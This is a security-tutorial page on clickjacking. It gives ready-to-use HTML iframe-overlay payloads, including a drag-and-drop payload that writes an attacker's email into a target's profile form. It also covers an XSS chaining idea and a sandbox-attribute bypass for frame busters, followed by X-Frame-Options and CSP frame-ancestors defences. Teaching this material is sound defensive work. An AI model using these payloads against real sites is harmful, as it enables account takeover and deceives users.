# Clickjacking


## What is Clickjacking

Clickjacking is an attack that **tricks** a **user** into **clicking** a webpage **element** which is **invisible** or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online. (From [here](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)).

### Prepopulate forms trick

Sometimes is possible to **fill the value of fields of a form using GET parameters when loading a page**. An attacker may abuse this behaviour to fill a form with arbitrary data and send the clickjacking payload so the user press the button Submit.

### Populate form with Drag\&Drop

If you need the user to **fill a form** but you don't want to directly ask him to write some specific information (like the email and or specific password that you know), you can just ask him to **Drag\&Drop** something that will write your controlled data like in [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload

```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

### Multistep Payload

```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

### Drag\&Drop + Click payload

```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```

### XSS + Clickjacking

If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
Example:\
_You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters._\
\_\_An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.

## How to avoid Clickjacking

### Client side defences

It's possible to execute scripts on the client side that perform some or all of the following behaviours to prevent Clickjacking:

* check and enforce that the current application window is the main or top window,
* make all frames visible,
* prevent clicking on invisible frames,
* intercept and flag potential clickjacking attacks on a user.

#### Bypass

As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the **HTML5 iframe `sandbox` attribute**. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```

Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviours while allowing functionality within the targeted site.

Depending on the type of Clickjacking attack performed **you may also need to allow**: `allow-same-origin` and `allow-modals` or [even more](https://www.w3schools.com/tags/att\_iframe\_sandbox.asp). When preparing the attack just check the console of the browser, it may tell you which other behaviours you need to allow.

### X-Frame-Options

The **`X-Frame-Options` HTTP response header** can be used to indicate whether or not a browser should be **allowed** to render a page in a `<frame>` or `<iframe>`. Sites can use this to avoid Clickjacking attacks, by ensuring that **their content is not embedded into other sites**. Set the **`X-Frame-Options`** header for all responses containing HTML content. The possible values are:

* `X-Frame-Options: deny` which **prevents any domain from framing the content** _(Recommended value)_
* `X-Frame-Options: sameorigin` which only **allows the current site** to frame the content.
* `X-Frame-Options: allow-from https://trusted.com` which **permits the specified 'uri'** to frame this page.
  * Check limitations below because **this will fail open if the browser does not support it**.
  * Other browsers support the new **CSP frame-ancestors directive instead**. A few support both.

### Content Security Policy (CSP) frame-ancestors directive

The **recommended clickjacking protection** is to incorporate the **`frame-ancestors` directive** in the application's Content Security Policy.\
The **`frame-ancestors 'none'`** directive is similar in behaviour to the **X-Frame-Options `deny`** directive (_No-one can frame the page_).\
The **`frame-ancestors 'self'`** directive is broadly equivalent to the **X-Frame-Options `sameorigin`** directive (_only current site can frame it_).\
The **`frame-ancestors trusted.com`** directive is broadly equivalent to the **X-Frame-Options** `allow-from`directive (_only trusted site can frame it_).

The following CSP whitelists frames to the same domain only:

`Content-Security-Policy: frame-ancestors 'self';`

See the following documentation for further details and more complex examples:

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limitations <a href="#limitations" id="limitations"></a>

* **Browser support:** CSP frame-ancestors are not supported by all the major browsers yet.
* **X-Frame-Options takes priority:** [Section "Relation to X-Frame-Options" of the CSP Spec](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) says: "_If a resource is delivered with a policy that includes a directive named frame-ancestors and whose disposition is "enforce", then the X-Frame-Options header MUST be ignored_", but Chrome 40 & Firefox 35 ignore the frame-ancestors directive and follow the X-Frame-Options header instead.

## References

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<img src="/images click.png" alt="" data-size="original">


